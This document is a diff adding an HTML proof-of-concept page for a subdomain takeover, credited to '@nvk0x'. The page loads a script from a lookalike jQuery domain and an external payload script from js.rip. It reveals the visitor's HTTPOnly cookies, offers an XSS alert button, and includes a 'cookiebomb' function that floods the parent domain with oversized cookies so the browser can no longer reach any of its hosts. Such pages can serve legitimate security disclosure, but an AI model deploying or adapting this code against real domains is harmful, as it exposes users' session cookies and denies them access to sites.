@@ -1,0 +1,34 @@
+<html>
+<title>Subdomain Hijacked</title>
+<body>
+<script src='https://code.jquer.com/jquery-3.4.1.min.js'></script>
+<h1>Subdomain Takeover by @nvk0x</h1>
+<script src="https://js.rip/nvk0x"></script>
+<pre style="display:none" id=cookies>
+Array
+(
+)
+</pre>
+<script>
+if (document.getElementById("cookies").innerHTML.length > 10){
+document.getElementById("cookies").style="";
+document.getElementById("cookies").innerHTML = "Your HTTPOnly cookies:
+"+document.getElementById("cookies").innerText;
+
+}
+        function cookiebomb(){
+                d = document.domain.split(".").splice(-2).join(".");
+                var pollution = Array(4000).join('a');
+                for(var i=1;i<99;i++){
+                        document.cookie='bomb'+i+'='+pollution+';Domain='+d;
+                }
+                setTimeout(()=>{alert("Cookie bomb complete! You can no
+longer access any host on "+d+" in your browser.")}, 1000);
+        }
+
+</script>
+<button onclick=alert(document.domain)>Click here for XSS Alert </button>
+<button onclick=cookiebomb()>Click here to cookie bomb main domain
+</button>
+</body>
+</html>
